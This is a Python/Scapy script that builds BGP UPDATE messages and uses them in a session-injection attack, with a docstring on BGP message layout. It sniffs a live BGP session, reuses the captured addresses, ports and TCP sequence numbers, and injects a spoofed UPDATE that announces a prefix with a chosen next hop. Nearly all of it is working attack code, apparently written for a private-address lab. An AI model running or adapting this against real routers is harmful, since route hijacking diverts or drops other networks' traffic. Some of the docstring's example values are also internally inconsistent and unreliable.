'''
EMPTY UPDATE EXAMPLE:
HEADER
    MARKER: ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
        - 16 bytes
    LENGTH: 23
        - 2 bytes
    TYPE: 2
        - 1 byte
UPDATE
    Withdrawn Routes Length: 0
        - 2 bytes
    Total Path Attribute Length: 0
        - 2 bytes


NON-EMPTY UPDATE EXAMPLE:
HEADER
    MARKER = ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
        - 16 bytes
    LENGTH: 55
        - 2 bytes
    TYPE: 2
        - 1 byte
UPDATE
    Withdrawn Routes Length: 0
        - 2 bytes
    Total Path Attribute Length: 0
        - 2 bytes
    Path attributes
        Path Attribute - ORIGIN: IGP = 40 01 01 00
            Flags: 0x40, Transitive, Well-known, Complete
                - 1 byte
            Type Code: ORIGIN (1)
                - 1 byte
            Length: 1
                - 1 byte
            Origin: IGP (0)
                - 1 byte
        Path Attribute - AS_PATH: AS_SEQUENCE: 64512
            Flags: 0x40, Transitive, Extended-Length, Well-known, Complete
                - 1 byte
            Type Code: AS_PATH (2)
                - 1 byte
            Length: 6
                - 2 bytes
            AS Path segment: 64512
                Segment type: AS_SEQUENCE (2)
                    - 1 byte
                Segment length (number of ASN): 1
                    - 1 byte
                AS4: 64512
                    - 4 bytes
        Path Attribute - NEXT_HOP: 192.168.0.254
        Path Attribute - MULTI_EXIT_DISC: 0
    Network Layer Reachability Information
        - 4 bytes
        192.168.0.0/24
            NLRI prefix length: 24
                - 1 byte
            NLRI prefix: 192.168.0.0


HEADER
    - 16 bytes marker
    - 2 bytes length
    - 1 byte type

UPDATE
    - 2 bytes withdrawn routes length
    - 2 bytes total path attribute length
    - path attributes
        - 1 byte flags
        - 1 byte type code
        - 1 byte length
        - X bytes data
    - 4 bytes NLRI


BGP Message Types:
    - OPEN (1)
    - UPDATE (2)
    - NOTIFICATION (3)
    - KEEPALIVE (4)
    - ROUTE-REFRESH (5)
'''

from scapy.all import sniff, sendp, IP, Ether, TCP, Raw
from time import sleep

class StructuredData:
    def __init__(self, structure: list[tuple[str, int]]) -> None:
        self.structure = structure


    def __len__(self):
        length = 0
        for _, size in self.structure:
            length += size
        return length


    def to_bytes(self):
        result = b''
        for field, size in self.structure:
            data = getattr(self, field)
            if isinstance(data, int):
                result += data.to_bytes(size, 'big')
            elif isinstance(data, bytes):
                if len(data) != size:
                    raise ValueError(f'Invalid length for field {field}: Expected {size} bytes, got {len(data)}.')
                result += data
            elif isinstance(data, list):
                if not data:
                    continue
                if isinstance(data[0], int):
                    result += b''.join([val.to_bytes(4, 'big') for val in data])
                else:
                    result += b''.join([val.to_bytes() for val in data])
            elif data is None and 'length' in field.lower():
                result += len(self).to_bytes(size, 'big')
            elif getattr(data, 'to_bytes', None):
                result += data.to_bytes()
        return result


class NLRI(StructuredData):
    def __init__(self, address, prefix) -> None:
        if prefix % 8 != 0:
            raise ValueError('Prefix length must be a multiple of 8')

        super().__init__([('prefix_length', 1), ('address', 3)])
        self.address = address
        self.prefix_length = prefix

    def to_bytes(self):
        result = b''
        for field, size in self.structure:
            data = getattr(self, field)
            if isinstance(data, int):
                result += data.to_bytes(size, 'big')
            elif isinstance(data, str):
                octets = data.split('.')[:size]
                for octet in octets:
                    result += int(octet).to_bytes(1, 'big')
        return result


class PathAttribute(StructuredData):
    '''
    Flags:
        0... ...  = Optional        - 0x80
        .0.. ...  = Transitive      - 0x40
        ..0. ...  = Partial         - 0x20
        ...0 ...  = Extended Length - 0x10
        .... 0000 = unused
    Impleemnt Type Codes:
        - ORIGIN (1)
        - AS_PATH (2)
        - NEXT_HOP (3)
        - MULTI_EXIT_DISC (4)
        - LOCAL_PREF (5)
    '''
    def __init__(self, flags: int, type_code: int) -> None:
        super().__init__([('flags', 1), ('type_code', 1), ('length', 1)])
        self.flags: int = flags
        self.type_code: int = type_code
        self.length: int | None = None
        # print(flags, bin(flags)[2:])
        if bin(flags)[2:6][2] == '1':
            self.structure[self.structure.index(('length', 1))] = ('length', 2)

    def __len__(self):
        length = 0
        for _, size in self.structure[3:]:
            length += size
        return length


class Origin(PathAttribute):
    '''
    Origin Codes:
        - IGP (0)
        - EGP (1)
        - INCOMPLETE (2)
    '''
    def __init__(self, flags, origin) -> None:
        super().__init__(flags, 1)
        self.origin = origin
        self.structure.append(('origin', 1))


class ASPath(PathAttribute):
    def __init__(self, flags: int, asns: list[int]) -> None:
        super().__init__(flags, 2)
        self.segment_type = 2
        self.asns = asns
        self.segment_length = len(asns)
        self.structure.append(('segment_type', 1))
        self.structure.append(('segment_length', 1))
        self.structure.append(('asns', 4 * self.segment_length))


class NextHop(PathAttribute):
    def __init__(self, flags: int, next_hop: str) -> None:
        super().__init__(flags, 3)
        self.next_hop = bytes([int(val) for val in next_hop.split('.')])
        self.structure.append(('next_hop', 4))


class MultiExitDisc(PathAttribute):
    def __init__(self, flags, med) -> None:
        super().__init__(flags, 4)
        self.med = med
        self.structure.append(('med', 4))


class BGPHeader(StructuredData):
    def __init__(self, type: int, marker=0xffffffffffffffffffffffffffffffff):
        super().__init__([('marker', 16), ('length', 2), ('type', 1)])
        self.marker = marker
        self.type = type
        self.length = 19


class BGPUpdate(StructuredData):
    def __init__(self, marker=0xffffffffffffffffffffffffffffffff):
        super().__init__([('header', 19)])
        self.header = BGPHeader(2, marker)
        self.withdrawn_routes_length = 0
        self.total_path_attribute_length = 0
        self.path_attributes = []
        self.nlri = None
        self.structure.append(('withdrawn_routes_length', 2))
        self.structure.append(('total_path_attribute_length', 2))
        self.structure.append(('path_attributes', None))
        self.structure.append(('nlri', 4))
        self.header.length += 8

    def add_path_attribute(self, path_attribute: PathAttribute):
        # [print(val) for val in path_attribute.structure[:3]]
        pa_length = len(path_attribute) + sum([val[1] for val in path_attribute.structure[:3]])
        # print(pa_length)
        self.path_attributes.append(path_attribute)
        self.total_path_attribute_length += pa_length
        self.header.length += pa_length

    def add_path_attributes(self, path_attributes: list[PathAttribute]):
        for path_attribute in path_attributes:
            self.add_path_attribute(path_attribute)

    def to_bytes(self):
        result = b''
        result += self.header.to_bytes()
        result += self.withdrawn_routes_length.to_bytes(2, 'big')
        result += self.total_path_attribute_length.to_bytes(2, 'big')
        result += b''.join([val.to_bytes() for val in self.path_attributes])
        result += self.nlri.to_bytes()
        return result

pkt = sniff(iface='eth1', filter='tcp port 179 and ip dst 192.168.0.254', count=1)
sleep(1)
# Create a new Ethernet frame
frame1=Ether()
# Set destination MAC address to captured BGP frame
frame1.dst = pkt[0].dst
# Set source MAC address to captured BGP frame
frame1.src = pkt[0].src
# Set Ethernet Type to captured BGP frame
frame1.type = pkt[0].type
# Set destination port to captured BGP packet TCP port number
mydport = pkt[0].dport
# Set source port to captured BGP packet TCP port number
mysport = pkt[0].sport
# Set sequence number to captured BGP packet + 19 
# (captured packet should be a KEEPALIVE which is 19 bytes)
seq_num = pkt[0].seq + 19 
# Set ack number to captured BGP packet
ack_num = pkt[0].ack
# Set source IP address to captured BGP packet
ipsrc = pkt[0][IP].src
# Set desination IP address to captured BGP packet
ipdst = pkt[0][IP].dst

data = BGPUpdate()
origin = Origin(0x40, 0)
as_path = ASPath(0x50, [64510])
next_hop = NextHop(0x40, '192.168.0.1')
med = MultiExitDisc(0x80, 0)
nlri = NLRI('192.168.1.0', 24)

data.add_path_attributes([origin, as_path, next_hop, med])
data.nlri = nlri
data: bytes = data.to_bytes()

bgp_update = IP(src=ipsrc, dst=ipdst, ttl=1)\
    /TCP(dport=mydport, sport=mysport, flags="PA", seq=seq_num, ack=ack_num)\
    /Raw(load=data)

sendp(frame1/bgp_update, iface='eth1')
